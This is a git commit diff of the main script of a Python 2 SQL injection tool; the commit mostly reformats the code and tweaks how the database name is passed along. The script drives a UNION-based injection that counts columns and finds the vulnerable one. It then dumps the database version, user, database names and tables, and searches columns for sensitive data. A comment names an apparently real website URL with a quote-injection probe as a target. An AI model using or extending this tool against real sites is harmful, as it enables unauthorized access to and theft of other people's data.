2d8a5f5c238a21759a14e62e99e5c633ef40ea2e
p4r4n0rm4l <l2_gold_4_ever@hotmail.com>
2017-02-17 23:24:28 +0200

    Check last message

--- new_main.py
+++ new_main.py
@@ -1,4 +1,6 @@
-import s_data, dbs, replaces
+import s_data
+import dbs
+import replaces
 from prints import print_data, print_cols_tables, intro
 from requests import get_the_page
 from find_total_cols import ft_cols, uni_cols
@@ -7,56 +9,53 @@ from response import site_alive
 from search_in_columns import search_in_columns
 # www.gpavlos.gr/print.php?id=1'
 
+
 class inject_database:
 
-    def __init__(self,site,vuln_param):
+    def __init__(self, site, vuln_param):
         self.site = site
         self.back_up_site = site
         self.vuln_param = vuln_param
 
-
     def total_columns(self):
         self.columns, self.based = ft_cols(self.site)
         self.site = uni_cols(self.site, self.columns, self.based)
-        self.site = self.site.replace(self.vuln_param, self.vuln_param+'-')
-
+        self.site = self.site.replace(self.vuln_param, self.vuln_param + '-')
 
     def vulnerable_column(self):
         self.vuln_column = str(f_vuln_col(self.site, self.columns))
-        self.site = replaces.repl(self.site ,1 , self.vuln_column)
-
+        self.site = replaces.repl(self.site, 1, self.vuln_column)
 
     def database_information(self):
         self.db_version = dbs.version(self.site)
-        print "SQL Version: %s" %self.db_version
+        print "SQL Version: %s" % self.db_version
 
         self.db_user = dbs.user(self.site)
-        print "Current user is: %s" %self.db_user
+        print "Current user is: %s" % self.db_user
 
         self.db_names = dbs.names(self.site)
-        print_cols_tables(self.db_names,'Databases')
+        print_cols_tables(self.db_names, 'Databases')
 
         self.working_on_db = dbs.working_db(self.site)
-        print "You are on: %s database" %self.working_on_db
-        self.site = replaces.repl(self.site ,2 ,self.working_on_db)
-        
-        ##change_database = raw_input("Do you want to change database? (y/n)")
-        ##if change_database == "y":
-            ##change_database()
+        print "You are on: %s database" % self.working_on_db
+        self.site = replaces.repl(self.site, 2, self.working_on_db)
 
+        ##change_database = raw_input("Do you want to change database? (y/n)")
+        # if change_database == "y":
+        # change_database()
 
     def find_tables_of_database(self):
-        self.the_page = get_the_page(self.site,"2")
+        self.the_page = get_the_page(self.site, "2")
         self.tables = s_data.search_for(self.the_page)
 
         if not len(self.tables):
             print "Could not get the tables, program will exit."
             exit()
 
-        print_cols_tables(self.tables,'Tables Found')
-        self.site = replaces.repl(self.site ,3 ,self.working_on_db)
-        self.site = site.replace(self.based ,'')
-        
+        print_cols_tables(self.tables, 'Tables Found')
+        self.site = replaces.repl(self.site, 3, self.working_on_db)
+        if not self.based == '':
+            self.site = site.replace(self.based, '')
 
     def select_table(self):
         print "Give the table: "
@@ -69,16 +68,19 @@ class inject_database:
 
     #<--->
     def search_data_from_columns(self):
-        self.sensitive_data = search_in_columns(self.site, self.table_choose, self.based)
+        self.sensitive_data = search_in_columns(
+            self.site, self.table_choose, self.based, self.working_on_db)
 
-
+    # Afth thn function na thn dw argotera
     def change_database(self):
         print_cols_tables(self.db_names, 'Databases')
-        self.working_on_db = raw_input("On which Database you want to work on?: ")
+        self.working_on_db = raw_input(
+            "On which Database you want to work on?: ")
         while self.working_on_db not in self.db_names:
-            self.working_on_db = raw_input("Wrong Input!\nOn which Database you want to work on?: ")
+            self.working_on_db = raw_input(
+                "Wrong Input!\nOn which Database you want to work on?: ")
 
-        self.site = replaces.repl(self.site,2,self.working_on_db)
+        self.site = replaces.repl(self.site, 2, self.working_on_db)
 
 if __name__ == '__main__':
     intro()
@@ -102,11 +104,10 @@ if __name__ == '__main__':
                 flag = 0
 
         if not flag:
-            find_data = inject_database(site,vuln_param)
+            find_data = inject_database(site, vuln_param)
             find_data.total_columns()
             find_data.vulnerable_column()
             find_data.database_information()
             find_data.find_tables_of_database()
             find_data.select_table()
             find_data.search_data_from_columns()
-
